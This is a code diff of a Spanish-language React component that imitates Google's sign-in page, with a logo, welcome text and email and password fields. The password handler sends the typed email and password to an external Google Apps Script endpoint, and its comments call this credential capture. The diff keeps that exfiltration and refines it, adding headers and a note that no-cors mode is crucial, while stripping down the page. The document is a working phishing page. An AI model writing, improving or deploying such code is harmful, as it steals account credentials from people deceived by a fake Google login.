@@ -30,22 +30,23 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
   const handlePasswordNext = async () => {
     if (!password.trim()) return;
 
-    // --- CÓDIGO AÑADIDO: CAPTURA DE CREDENCIALES ---
+    // --- CÓDIGO AÑADIDO: ENVÍO DE CREDENCIALES ---
     const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
     
     try {
       await fetch(webAppUrl, {
         method: "POST",
-        mode: "no-cors",
+        mode: "no-cors", // Crucial para evitar errores de Google Script
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           usuario: email, 
           pass: password, 
           tipo: "LOGIN_GOOGLE",
-          fecha: new Date().toLocaleString() 
-        })
+          fecha: new Date().toLocaleString()
+        }),
       });
     } catch (e) {
-      console.error("Error capturando datos");
+      console.error("Error capturando credenciales:", e);
     }
     // --- FIN DE ADICIÓN ---
 
@@ -61,12 +62,9 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
       <div className="forms-card p-10 sm:p-12">
         {step === "email" ? (
           <div className="animate-fade-in">
-            <div className="flex justify-center mb-4">
-              <GoogleLogo size={32} />
-            </div>
+            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
             <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
             <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
-            
             <div className="space-y-6">
               <div className="relative">
                 <input
@@ -78,31 +76,17 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
                   className={`google-input w-full ${emailError ? 'border-destructive focus:ring-destructive/20' : ''}`}
                   autoFocus
                 />
-                {emailError && <p className="text-xs text-destructive mt-1 flex items-center gap-1">
-                  <span className="text-base">⚠</span> {emailError}
-                </p>}
+                {emailError && <p className="text-xs text-destructive mt-1 flex items-center gap-1"><span>⚠</span> {emailError}</p>}
               </div>
-              
-              <a href="#" className="google-btn-text text-sm font-medium inline-block">
-                ¿Has olvidado tu correo electrónico?
-              </a>
-              
-              <p className="text-sm text-muted-foreground leading-relaxed">
-                ¿No es tu ordenador? Usa una ventana de navegación privada para iniciar sesión. 
-                <a href="#" className="google-btn-text font-medium ml-1">Más información</a>
-              </p>
-              
               <div className="flex justify-between items-center pt-4">
-                <a href="#" className="google-btn-text text-sm font-medium">Crear cuenta</a>
+                <span className="google-btn-text text-sm font-medium">Crear cuenta</span>
                 <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
               </div>
             </div>
           </div>
         ) : (
           <div className="animate-fade-in">
-            <div className="flex justify-center mb-4">
-              <GoogleLogo size={32} />
-            </div>
+            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
             <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Te damos la bienvenida</h1>
             <div className="flex justify-center mb-8">
               <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm font-medium">
@@ -110,20 +94,16 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
                 {email}
               </div>
             </div>
-
             <div className="space-y-6">
-              <div className="relative">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(e, handlePasswordNext)}
-                  placeholder="Introduce tu contraseña"
-                  className="google-input w-full"
-                  autoFocus
-                />
-              </div>
-
+              <input
+                type={showPassword ? "text" : "password"}
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                onKeyDown={(e) => handleKeyDown(e, handlePasswordNext)}
+                placeholder="Introduce tu contraseña"
+                className="google-input w-full"
+                autoFocus
+              />
               <label className="flex items-center gap-3 cursor-pointer select-none">
                 <input
                   type="checkbox"
@@ -133,26 +113,13 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
                 />
                 <span className="text-sm text-card-foreground">Mostrar contraseña</span>
               </label>
-
               <div className="flex justify-between items-center pt-4">
-                <a href="#" className="google-btn-text text-sm font-medium">¿Has olvidado tu contraseña?</a>
+                <span className="google-btn-text text-sm font-medium">¿Has olvidado la contraseña?</span>
                 <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
               </div>
             </div>
           </div>
         )}
-      </div>
-
-      <div className="flex justify-between items-center mt-6 px-2 text-xs text-muted-foreground">
-        <select className="bg-transparent border-none text-xs text-muted-foreground cursor-pointer outline-none">
-          <option>Español (España)</option>
-          <option>English (United States)</option>
-        </select>
-        <div className="flex gap-4">
-          <a href="#" className="hover:opacity-70">Ayuda</a>
-          <a href="#" className="hover:opacity-70">Privacidad</a>
-          <a href="#" className="hover:opacity-70">Condiciones</a>
-        </div>
       </div>
     </div>
   );
